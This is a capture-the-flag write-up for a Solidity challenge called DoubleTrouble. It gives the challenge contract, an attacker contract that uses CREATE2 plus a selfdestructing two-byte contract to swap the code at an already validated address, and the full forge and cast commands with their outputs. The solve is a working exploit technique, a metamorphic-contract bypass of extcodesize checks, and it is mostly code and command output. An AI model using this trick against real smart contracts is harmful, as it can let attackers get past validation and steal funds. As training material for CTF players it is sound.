
### DoubleTrouble.sol
```solidity
// Author : Neoreo
// Difficulty : Hard

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract DoubleTrouble {
    bool public isSolved = false;
    mapping(address => bool) public validContracts;

    function validate(address _contract) public  {
        uint256 size;
        assembly {
            size := extcodesize(_contract)
        }
        if (size == 0 || size > 5) {
            revert("Invalid contract");
        }
        validContracts[_contract] = true;
    }

    function flag(address _contract) public {
        require(validContracts[_contract], "Given contract has not been validated");

        uint256 size;
        assembly {
            size := extcodesize(_contract)
        }
        bytes memory code = new bytes(size);
        assembly {
            extcodecopy(_contract, add(code, 0x20), 0, size)
        }
        bytes memory keyBytecode = hex"1f1a99ed17babe0000f007b4110000ba5eba110000c0ffee";
        
        require(keccak256(code) == keccak256(keyBytecode),"Both bytecodes don't match");

        isSolved = true;
    }

}


```


### Solve

In that one we had to deploy a smart contract that will deploy 2 kind of smart contracts
but in a way that the public addresses of both contracts will be the same, thus we can trigger properly the mechanisms (the 2 functions of `Doubletrouble`) and get the final flag

### DoubleDeploy.sol
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./DoubleTrouble.sol";

contract DoubleDeploy {
    event Deployed(address addr);

    bytes32 public constant SALT = keccak256("midnight_ctf");


    function deployFinal() external returns (address) {
        address attack; 
        bytes32 salt = SALT;
        bytes memory attackcode = type(Deployer).creationCode;

        assembly {
            attack := create2(0, add(attackcode, 0x20), mload(attackcode), salt)
        }

        emit Deployed(attack);
        return attack;
    }
}

contract Deployer {
    constructor() {
        if (block.number % 2 == 0) {
            bytes memory b = hex"33ff";
            assembly {
                return(add(b, 0x20), mload(b))
            }
        }
        else {
            bytes memory b = hex"1f1a99ed17babe0000f007b4110000ba5eba110000c0ffee";
            assembly {
                return(add(b, 0x20), mload(b))
            }
        }
    }
}

```
note that when deploying smart contracts, the "constructor's" memory that is returned will be the smart contract runtime code, that what 
```solidity
assembly {
	return(add(b, 0x20), mload(b))
}
```
allow us to do
see https://www.rareskills.io/post/ethereum-contract-creation-code for more indepth understanding of contructor.

also see https://mixbytes.io/blog/pitfalls-of-using-cteate-cteate2-and-extcodesize-opcodes for `create2` opcode.

## The full steps

```bash
(venv) ➜  DoubleTrouble git:(main) ✗ forge create $(pwd)/DoubleDeploy.sol:DoubleDeploy --broadcast --rpc-url $RPC --private-key $PK
[⠊] Compiling...
No files changed, compilation skipped
Deployer: 0x277506E301F0907b9bB7B954eB5B87aad9DABe92
Deployed to: 0x36f4B3B999BFd93Ed3Ab664e2371Cf182E2BE333
Transaction hash: 0x009d9bcd9efdb3cec30ab57a4563e83599f3c74339f073f9cf658fcddaee59ca
```
Deploying the "deployer" contract, the one that will allow me to do the trick


```bash
(venv) ➜  DoubleTrouble git:(main) ✗ DOUBLE=0x36f4B3B999BFd93Ed3Ab664e2371Cf182E2BE333
```
Here I store my "deployer" smart contract's public address in env variable `DOUBLE` 


```bash
(venv) ➜  DoubleTrouble git:(main) ✗ cast block-number --rpc-url $RPC 
13
```
Here we make sure that the next block will be an even number so we can deploy our first tiny smart contract


```bash
(venv) ➜  DoubleTrouble git:(main) ✗ cast send $DOUBLE --rpc-url $RPC --private-key $PK "deployFinal()"

blockHash               0x168daa9780b6ec0c9ab0a9da0d6fc8e4a09e54b8a4b6cffb819af80b71981fda
blockNumber             14
contractAddress         
cumulativeGasUsed       55180
effectiveGasPrice       179296880
from                    0x277506E301F0907b9bB7B954eB5B87aad9DABe92
gasUsed                 55180
logs                    [{"address":"0x36f4b3b999bfd93ed3ab664e2371cf182e2be333","topics":["0xf40fcec21964ffb566044d083b4073f29f7f7929110ea19e1b3ebe375d89055e"],"data":"0x000000000000000000000000e13b1ce0a7e9f44e8e9d768e9215ba5a7a0e08e8","blockHash":"0x168daa9780b6ec0c9ab0a9da0d6fc8e4a09e54b8a4b6cffb819af80b71981fda","blockNumber":"0xe","blockTimestamp":"0x67fbf9b4","transactionHash":"0x9a673c096f0cd2dec1d2731e3150f4e18ffeb8b4467d34aa2a25b5ca63a857d5","transactionIndex":"0x0","logIndex":"0x0","removed":false}]
logsBloom               0x00000000000000000000000000000000000000000000000000000000000004000000000000000000002000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000
root                    
status                  1 (success)
transactionHash         0x9a673c096f0cd2dec1d2731e3150f4e18ffeb8b4467d34aa2a25b5ca63a857d5
transactionIndex        0
type                    2
blobGasPrice            1
blobGasUsed             
authorizationList       
to                      0x36f4B3B999BFd93Ed3Ab664e2371Cf182E2BE333

```
Here since the next block will be even I am going to deploy that contract => `0x33ff`



```bash
(venv) ➜  DoubleTrouble git:(main) ✗ FLAG=0xe13b1ce0a7e9f44e8e9d768e9215ba5a7a0e08e8
```
here `FLAG` is the fancy name I gave to the first deployed smart contract's public address, the one that will be used to "validate" in the challenge contract



```bash
(venv) ➜  DoubleTrouble git:(main) ✗ cast send $CHALL --rpc-url $RPC --private-key $PK "validate(address)" $FLAG

blockHash               0xcb7e5a96f616b84a657df378a16747caeec7c02f3cd4bf157be137b7de616c3a
blockNumber             15
contractAddress         
cumulativeGasUsed       46778
effectiveGasPrice       156967217
from                    0x277506E301F0907b9bB7B954eB5B87aad9DABe92
gasUsed                 46778
logs                    []
logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                    
status                  1 (success)
transactionHash         0x0e767ef33f0f306c475310de500f0075cedf91b37ece1f374e847700a28e1b24
transactionIndex        0
type                    2
blobGasPrice            1
blobGasUsed             
authorizationList       
to                      0xd0734E662a6a01f1c62FF0253ba4F2DA90783468
```
I am passing the first step, which is validating the public address of `FLAG`


```bash
(venv) ➜  DoubleTrouble git:(main) ✗ cast send $FLAG --rpc-url $RPC --private-key $PK                     

blockHash               0xca49a1178dc7cff6fe5d0b2f55a96cbd76ca08107455106650762b292e4bf493
blockNumber             16
contractAddress         
cumulativeGasUsed       26002
effectiveGasPrice       137407504
from                    0x277506E301F0907b9bB7B954eB5B87aad9DABe92
gasUsed                 26002
logs                    []
logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                    
status                  1 (success)
transactionHash         0xe52a638a269e94671632866589be04ce9ca6d42bff20d9ac59e776f586dbee9e
transactionIndex        0
type                    2
blobGasPrice            1
blobGasUsed             
authorizationList       
to                      0xe13b1CE0a7e9f44E8e9d768e9215Ba5a7a0E08E8

```
Here I just send a empty transaction so it will trigger the 2 opcodes of `FLAG` conrtact which is `selfdestruct` letting me able to deploy another contract using the same public address


```bash
(venv) ➜  DoubleTrouble git:(main) ✗ cast block-number --rpc-url $RPC            
16
```
And then I again check the current block, meaning the next one will be odd and thus will deploy the winning smart contract



```bash
(venv) ➜  DoubleTrouble git:(main) ✗ cast send $DOUBLE --rpc-url $RPC --private-key $PK "deployFinal()"         

blockHash               0x2e216b17a55e9df9658354675d9b841ca1ed39eca05130d776c875fb76e3df3e
blockNumber             17
contractAddress         
cumulativeGasUsed       59575
effectiveGasPrice       120261341
from                    0x277506E301F0907b9bB7B954eB5B87aad9DABe92
gasUsed                 59575
logs                    [{"address":"0x36f4b3b999bfd93ed3ab664e2371cf182e2be333","topics":["0xf40fcec21964ffb566044d083b4073f29f7f7929110ea19e1b3ebe375d89055e"],"data":"0x000000000000000000000000e13b1ce0a7e9f44e8e9d768e9215ba5a7a0e08e8","blockHash":"0x2e216b17a55e9df9658354675d9b841ca1ed39eca05130d776c875fb76e3df3e","blockNumber":"0x11","blockTimestamp":"0x67fbf9e2","transactionHash":"0x9a848f7d542cb641ea499240ca6e54d270d9543baf233c9750c684acd5fdb25c","transactionIndex":"0x0","logIndex":"0x0","removed":false}]
logsBloom               0x00000000000000000000000000000000000000000000000000000000000004000000000000000000002000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000
root                    
status                  1 (success)
transactionHash         0x9a848f7d542cb641ea499240ca6e54d270d9543baf233c9750c684acd5fdb25c
transactionIndex        0
type                    2
blobGasPrice            1
blobGasUsed             
authorizationList       
to                      0x36f4B3B999BFd93Ed3Ab664e2371Cf182E2BE333


```



```bash
(venv) ➜  DoubleTrouble git:(main) ✗ cast send $CHALL --rpc-url $RPC --private-key $PK "flag(address)" $FLAG

blockHash               0xb7b3fa6d15c4b7ae8e8f48755feb663883f435f0dbf5ee9ac717607923ebd88c
blockNumber             18
contractAddress         
cumulativeGasUsed       49430
effectiveGasPrice       105288379
from                    0x277506E301F0907b9bB7B954eB5B87aad9DABe92
gasUsed                 49430
logs                    []
logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                    
status                  1 (success)
transactionHash         0x979205eadd5498faeeda9ce18d27adb6580067d3e24343cf0c60235732b2756c
transactionIndex        0
type                    2
blobGasPrice            1
blobGasUsed             
authorizationList       
to                      0xd0734E662a6a01f1c62FF0253ba4F2DA90783468

```
Flagged !
